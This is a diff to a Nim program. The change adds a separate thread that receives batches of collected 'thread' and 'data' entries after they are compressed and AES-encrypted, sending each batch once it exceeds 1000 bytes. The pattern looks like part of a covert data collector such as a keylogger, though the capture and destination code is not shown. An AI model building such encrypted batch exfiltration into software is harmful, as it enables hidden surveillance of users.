@@ -172,7 +172,17 @@ from os import sleep
 from lib/functions/generateHeader import header
 
 var prevThread: string = ""
-var res: string = header()
+var header: string = header()
+var res: string = header
+
+from lib/threads/sendThread import initSendThread
+from lib/channels import sendThreadChannel
+
+var sendThreadVar: Thread[void]
+
+open sendThreadChannel
+
+createThread(sendThreadVar, initSendThread)
 
 import lib/more/zlibstatic/src/zlibstatic/zlib
 import lib/functions/encryptAES
@@ -187,10 +197,13 @@ while true:
     if prevThread != thread:
       prevThread = thread
       res.add "." & thread & ","
-
     res.add ";" & data
-    echo "\n"
-    echo len encrypt compress(res, stream = RAW_DEFLATE)
+
+    let finalData: string = encrypt compress(res, stream = RAW_DEFLATE)
+
+    if finalData.len > 1000:
+      sendThreadChannel.send finalData
+      res = header
   ## TODO: n as vrea sa folosesc sleep(10)
   ## asa ca e probabil sa modifc aici oricand
   sleep(10)
